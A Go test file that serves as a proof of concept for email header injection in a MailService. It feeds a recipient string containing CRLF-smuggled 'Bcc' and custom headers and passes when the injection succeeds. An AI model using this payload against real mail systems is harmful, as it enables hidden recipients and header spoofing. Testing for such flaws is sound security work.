package service

import (
	"net/smtp"
	"strings"
	"testing"
)

func TestMailHeaderInjectionPoC(t *testing.T) {
	var captured []byte
	m := &MailService{Host: "127.0.0.1", Port: "587", From: "pokget@example.com", BaseURL: "http://x"}
	m.sendMailFunc = func(addr string, a smtp.Auth, from string, to []string, msg []byte) error {
		captured = msg
		return nil
	}
	evil := "attacker@example.com\r\nBcc: victim@example.net\r\nX-Injected: yes"
	if err := m.sendMail(evil, "subject", "body"); err != nil {
		t.Fatal(err)
	}
	s := string(captured)
	if strings.Contains(s, "Bcc: victim@example.net\r\n") && strings.Contains(s, "X-Injected: yes") {
		t.Logf("INJECTION CONFIRMED:\n%s", s)
	} else {
		t.Fatalf("not injectable:\n%s", s)
	}
}
